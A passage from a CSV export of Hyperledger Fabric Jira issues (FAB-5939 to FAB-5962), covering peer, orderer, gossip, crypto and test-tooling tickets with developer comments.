 ;;;","17/Oct/17 5:52 AM;dongming;Close for now since PTE is unable to communicate with composer generated chaincode;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Transaction Simulator getting used even after calling done,FAB-5939,20465,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,muralisr,manish-sethi,manish-sethi,29/Aug/17 12:01 AM,08/Sep/18 1:57 AM,28/Oct/23 3:00 AM,08/Sep/18 1:57 AM,,,,v1.3.0,,fabric-peer,,,,,,0,,,,,,,"In V1.0 code, peer panics if a transaction simulator instance is accessed after calling `Done()` on the instance - See FAB-5830.

As a fix for FAB-5830, the above mentioned panic has been replaced by an error - (https://gerrit.hyperledger.org/r/#/c/12851/)

This JIRA item exists so that the actual cause can be fixed in the chaincode framework - i.e., the chaincode framework should not use the simulator after calling `Done` function on this.",,jyellick,kchristidis,manish-sethi,muralisr,sykesm,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyelj:",,,,,,,,,,,,,,,,,,,,,,,jyellick,kchristidis,manish-sethi,muralisr,sykesm,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/Feb/18 9:25 PM;yacovm;[~muralisr] I think this should be tabled to be solved in v1.2 after your FSM refactoring, no?;;;","01/Feb/18 10:43 PM;muralisr;[~yacovm] Agreed. This belongs to the cleanup.;;;","05/May/18 2:15 AM;jyellick;[~sykesm] I'm assuming this has been fixed in your refactor?;;;","22/May/18 3:14 AM;kchristidis;[~sykesm]: See question above.;;;","27/May/18 8:40 AM;muralisr;[~kchristidis] [~jyellick]  This has a broader scope than the refactor and likely not fixed by it. Let me take a closer look and update.;;;","06/Sep/18 11:32 PM;sykesm;[~muralisr] Have you had a chance to take a look at this at some point over the past few months? Any updates?

Thanks.;;;","08/Sep/18 1:57 AM;sykesm;I don't know the how this originally surfaced but I haven't seen any updates in a while. At this point, I'm going to assume that this has been addressed.

If this is still an issue, we can reopen as needed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add cello as submodule,FAB-5940,20468,20392,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,latitiah,latitiah,latitiah,29/Aug/17 3:42 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,09/Sep/17 5:01 AM,,,,,,,,,,,,0,,,,,,,Add the cello project as a submodule such that the project can be built and used during certain deployment steps in the testing process.  ,,baohua,latitiah,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyelr:",,,,,,Sprint 19 - Quality,,,,,,,,,,,,,,,,,baohua,latitiah,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,,,,,,true,"29/Aug/17 4:26 PM;baohua;I may miss something, is there any description on the work?;;;","29/Aug/17 11:45 PM;latitiah;[~baohua], Yes, good catch. My apologies.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add functionality to bring up fabric network on local host,FAB-5941,20469,20392,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,latitiah,latitiah,29/Aug/17 3:42 AM,30/Jul/19 10:09 AM,28/Oct/23 3:00 AM,30/Jul/19 10:09 AM,,,,,,,,,,,,0,,,,,,,,,latitiah,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyelz:",,,,,,Sprint 19 - Quality,,,,,,,,,,,,,,,,,latitiah,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Jul/19 10:09 AM;mastersingh24;BDD replace with integration tests;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add functionality to bring up fabric network in a multi-host setup,FAB-5942,20470,20392,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,latitiah,latitiah,29/Aug/17 3:44 AM,30/Jul/19 10:09 AM,28/Oct/23 3:00 AM,30/Jul/19 10:09 AM,,,,,,,,,,,,0,,,,,,,,,asuchit,latitiah,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyem7:",,,,,,Sprint 19 - Quality,,,,,,,,,,,,,,,,,asuchit,latitiah,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Jul/19 10:09 AM;mastersingh24;BDD replace with integration tests;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Restore assorted config update checks which were disabled in refactor.,FAB-5944,20472,20118,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,29/Aug/17 4:20 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,03/Sep/17 10:59 PM,,,,,,fabric-orderer,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyemn:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
default CSCC.GetConfigBlock should be a channel specific resource,FAB-5945,20473,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,muralisr,muralisr,muralisr,29/Aug/17 5:02 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,30/Aug/17 3:41 AM,,,,,,fabric-peer,,,,,,0,,,,,,,CSCC.GetConfigBlock is listed as a peer wide resource. It should be channel specific.,,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyemv:",,,,,,,,,,,,,,,,,,,,,,,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Restore sanity checking for policy updates.,FAB-5946,20474,20118,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,29/Aug/17 5:28 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,03/Sep/17 10:59 PM,,,,,,fabric-orderer,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyen3:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
how to print the rate of the broadcast_msg,FAB-5949,20477,,Story,Closed,FAB,Fabric,software,denyeart,,,Low,Done,ajp,chenxuan,chenxuan,29/Aug/17 11:30 AM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,17/Mar/18 2:13 AM,,,,v1.2.0,,fabric-orderer,,,,,,0,,,,,,,"in the orderer/sample_clients,it provide many tool to test the orderer,like the broadcast_msg,
but when i use the command to start the broadcast_msg,it show nothing,just running,so i think the rate of progress should be provide",,ajp,chenxuan,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyenr:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ajp,chenxuan,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"07/Sep/17 10:56 AM;kchristidis;[~asaningmaxchain]: What is the status of this?;;;","08/Sep/17 2:15 AM;kchristidis;[~ajp] has expressed interest in taking this, and since it's been 10d from the original assignment w/o updates, I think we can switch.;;;","08/Sep/17 11:09 AM;kchristidis;So it turns out that [~asaningmaxchain] did put a changeset out there: [https://gerrit.hyperledger.org/r/c/12953/]

I had missed that since this JIRA wasn't updated accordingly.

I know that [~ajp] has a changeset out there good to go as well.

Let's review both and go with what's best.

My apologies to both of you for not catching this earlier.;;;","09/Sep/17 12:07 AM;ajp;Changeset can be found here:

[https://gerrit.hyperledger.org/r/#/c/13271/];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The retry policy of peer to orderer should be configurable,FAB-5950,20478,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,nirro,Eagel,Eagel,29/Aug/17 4:12 PM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,17/Apr/18 3:40 AM,v1.0.1,,,v1.2.0,,fabric-peer,,,,,,0,,,,,,,"The following code include the configuration for the retry policy of peer to orderer. but it be hard coded. I think it should be configurable by someway.

File: core/deliverservice/deliveryclient.go

Line 31:

<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

var (

reConnectTotalTimeThreshold = time.Second * 60 * 5

connTimeout                 = time.Second * 3

reConnectBackoffThreshold   = float64(time.Hour)

)

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

 

Line 37

<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

// SetReconnectTotalTimeThreshold sets the total time the delivery service

// may spend in reconnection attempts until its retry logic gives up

// and returns an error

func SetReconnectTotalTimeThreshold(duration time.Duration) \{

reConnectTotalTimeThreshold = duration

}

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>",,C0rWin,Eagel,nirro,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyenz:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,C0rWin,Eagel,nirro,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"16/Apr/18 10:02 PM;C0rWin;https://gerrit.hyperledger.org/r/#/c/20617/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Enhance BCCSP with the ability to take an IV or PRNG as encryption input ,FAB-5951,20485,13135,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,angelo.decaro,elli-androulaki,elli-androulaki,29/Aug/17 5:28 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,26/Sep/17 3:57 PM,,,,,,fabric-crypto,,,,,,0,,,,,,,"BCCSP encryption capability currently takes as input the message to be encrypted, the encryption key and algorithm the encryption is to be performed with. 

We want to enhance the input provided to the encryption function to consider an IV (for symmetric encryption) or PRNG, that would determine the randomness used in the encryption process.

Currently randomness is derived directly by the system and in the case where chaincodes require more than one endorsements this can result into the two endorsers resulting into two different WriteSets, i.e., different ciphertexts for the same value. 

With this enhancement it would be possible for encshim (FAB-830) to be extended to leverage a transient data-passed PRNG or IV to determine the randomness during the encryption process and ultimately support encryption on chaincode side, for chaincodes with >1 endorsements required in their endorsement policy. FAB-5952 is related JIRA issue.",,denyeart,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,28800,28800,,0%,28800,28800,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyeon:",,,,,,Sprint 10 - Crypto,,,,,,,,,,,,,,,,,denyeart,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"20/Sep/17 6:18 AM;denyeart;It is not viable to deliver FAB-830 as a production feature without this item, since this item adds support for multiple (deterministic) endorsements.  Therefore I'm shifting it to be a child subtask of FAB-830 and removing TechPreview tag.

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
I want to allow encshim to generate ciphertexts deterministically,FAB-5952,20486,13135,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,elli-androulaki,elli-androulaki,29/Aug/17 5:32 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,03/Oct/17 4:33 AM,,,,,,fabric-crypto,,,,,,0,,,,,,,"This builds on top of FAB-5951, to allow for encshim to leverage a PRNG/IV passed to it using proposal's transient data to determine the randomness used in encryption process, and therefore allow for deterministically generated ciphertexts.

This is needed in the case of chaincodes that leverage encshim and require more than one endorsements for their endorsement policy to be satisfied.

If such an enhancement is not used,  endorsers would use their local source of randomness and would likely result into different ciphertexts for the same value. ",,denyeart,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,57600,57600,,0%,57600,57600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyeov:",,,,,,Sprint 10 - Crypto,,,,,,,,,,,,,,,,,denyeart,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/Sep/17 6:19 AM;denyeart;It is not viable to deliver FAB-830 as a production feature without this item, since this item adds support for multiple (deterministic) endorsements.  Therefore I'm shifting it to be a child subtask of FAB-830 and removing TechPreview tag.;;;","26/Sep/17 10:30 PM;Clayton Sims;What is the CR # for this?;;;","26/Sep/17 11:51 PM;elli-androulaki;https://gerrit.hyperledger.org/r/#/c/13739/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
implement leave channel in gossip (no support for peer yet),FAB-5953,20487,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,29/Aug/17 5:42 PM,22/Nov/18 2:41 PM,28/Oct/23 3:00 AM,19/Jun/18 9:45 AM,,,,v1.2.0,,fabric-gossip,fabric-peer,,,,,1,,,,,,,In order to not process blocks or request blocks of a channel that has been upgraded further than the peer's code can support - we must implement leave channel.,,baohua,davidkhala,denyeart,itsme24543,manish-sethi,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyep3:",,,,,,,,,,,,,,,,,,,,,,,baohua,davidkhala,denyeart,itsme24543,manish-sethi,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Jun/18 7:42 AM;denyeart;[~yacovm] Anything else needed here? If not, please close.;;;","02/Oct/18 4:05 AM;itsme24543;[~yacovm] where can i find the documentation for a peer to leave a channel?

Thanks in advance and sorry for posting this on a closed ticket..;;;","02/Oct/18 6:06 AM;yacovm;ah, so - at some point we wanted to implement leave channel, but - eventually we didn't do that.
However - Since peers run a metadata dissemination protocol among themselves, preparations to support leave channel were needed in order
to support leave channel at a later version.

So I implemented the needed support for gossip, and it knows to understand that peers left a channel starting from v1.1, however - we're currently at v1.3 and still we didn't implement it in the peer... ;;;","02/Oct/18 7:17 AM;itsme24543;Thanks [~yacovm] ..is there a ticket to do this on the peer..that will come in a future version..are there any workarounds that we can implement right now..willing to try anything..;;;","02/Oct/18 3:00 PM;yacovm;Workarounds - that depends... can you explain your use case? A workaround depends on what you need.

I think the tricky part in a ""workaround"" is that the index of the ledger is shared among all chains ([~manish-sethi] please correct me if I'm wrong?)
If we could somehow remove a chain from the index then we could just wipe the block files of the chain and restart the peer... ;;;","02/Oct/18 9:44 PM;manish-sethi;Yes, the index is shared among all chains and also state would be there for the chain. That should not be a problem. If you delete the index and statedb, upon restart (assuming after deleting the block files), the index and statedb are rebuilt.

However, having said this, there is another place where one may get stuck - which is ledgermgmt. This keeps track of all the chains that the peer is part of. So, best would be to avoid any manual operation of this sort.;;;","15/Nov/18 4:38 PM;baohua;+1 to this, as the peer's lifecycle is still not a close-loop with both channel and chaincode resources.

This is a basic requirement somehow.;;;","16/Nov/18 11:09 PM;davidkhala;By the way, is it possible that we can propose a uninstall chaincode function, for houseKeep purpose. For example, one the chaincode has been upgraded to a new version, we could delete the old one;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add stop/start to lscc,FAB-5954,20489,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,jiangyaoguo,jiangyaoguo,jiangyaoguo,29/Aug/17 6:00 PM,23/Jan/20 7:03 AM,28/Oct/23 3:00 AM,23/Jan/20 7:03 AM,,,,Future,,fabric-peer,,,,,,0,stale-item,,,,,,"Add ""deactivate/activate"" function to lscc. Once the ""deactivate"" transaction was committed to ledger of channel. Peer should reject all endorsing request for this chaincode on channel. Uses can reenable chaincode by ""activate"" operation.

This is useful when there may be problem of chaincode or other unexpected transactions happen. With this operator can ""deactivate"" chaincode to stop transactions of specified chaincode and then fix the problem by  ""chaincode upgrade"" operation. After ""upgrade"", ""activate"" the chaincode.",,denyeart,jiangyaoguo,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5999,,,,,,,,,,,,,,,,,,,,,,,FAB-5781,FAB-5955,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyepb:",,,,,,,,,,,,,,,,,,,,,,,denyeart,jiangyaoguo,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/May/18 6:21 AM;denyeart;[https://gerrit.hyperledger.org/r/#/c/12901/]  (abandoned due to lack of activity);;;","23/Jan/20 7:03 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
chaincode stop/start at committer side,FAB-5955,20492,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,jiangyaoguo,jiangyaoguo,jiangyaoguo,29/Aug/17 6:05 PM,26/Oct/18 7:57 AM,28/Oct/23 3:00 AM,26/Oct/18 7:57 AM,,,,,,fabric-ledger,,,,,,0,,,,,,,"Handle ""stop/start"" transaction process at committer side.  Committer should invalid all the transactions that invoke stopped chaincode. and after chaincode is started, committer should apply transactions of stopped chaincode again.

 

Let's design the full lifecycle management of Chaincode at [https://docs.google.com/document/d/1aSWNOuvOBzi1OzZ-b8h0IP-Qs6JL8iREXM7Jtc0VkE0.] Welcome for comments!",,jiangyaoguo,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5781,,,,FAB-5954,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyepj:",,,,,,,,,,,,,,,,,,,,,,,jiangyaoguo,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Oct/18 7:57 AM;mastersingh24;See https://jira.hyperledger.org/browse/FAB-11237 for the new lifecycle.  No need to do this anymore;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Composer Playground - Could not Issue New ID,FAB-5957,20495,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Venkatr,Venkatr,29/Aug/17 7:42 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,02/Oct/17 8:43 PM,,,,WON'T FIX,,,,,,,,0,,,,,,,"'Issue New ID' link pops up a windows with IDName and Participant fields. When filled up and choose to 'Create New', there is no response. No error message either.",,kchristidis,Venkatr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyepz:",,,,,,,,,,,,,,,,,,,,,,,kchristidis,Venkatr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Oct/17 8:42 PM;kchristidis;Hi Ven, please use [https://github.com/hyperledger/composer/issues] to report this.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
cleaup fabric-sdk-node CI scripts,FAB-5960,20514,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,30/Aug/17 1:29 AM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,31/Aug/17 9:55 PM,,,,,,fabric-ci,,,,,,0,fabric-ci,,,,,,"clean up fabric-sdk-node ci scripts

Add more debug statements

remove npm-publish from node6 job

Add code coverage report for fabric-chaincode-node CI job.

Add more debug statements.",,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyerr:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Aug/17 10:43 PM;rameshthoomu;Submitted patch.. In-progress;;;","31/Aug/17 9:55 PM;rameshthoomu;Patch has been merged and all the changes are working as expected. Closing this now.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Fabric-test (Behave): usage of ""deploy"" should be limited to install and instantiation of a chaincode only",FAB-5962,20516,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,AdnanChoudhury,AdnanChoudhury,AdnanChoudhury,30/Aug/17 3:27 AM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,13/Sep/17 11:28 PM,,,,,,fabric-build,,,,,,0,quality,,,,,,"In the current Behave feature files (`fabric-test` repo) the term *deploy* stands for a combination of two steps:
1) creating a channel, and joining the channel by the peer,
3) install and instantiate the chaincode

This contradicts with the usage of  the term *deploy* in Fabric, where it means install and instantiate a chaincode only.

The *deploy* in behave should be broken down in two parts mentioned above. ",,AdnanChoudhury,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyerz:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,AdnanChoudhury,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text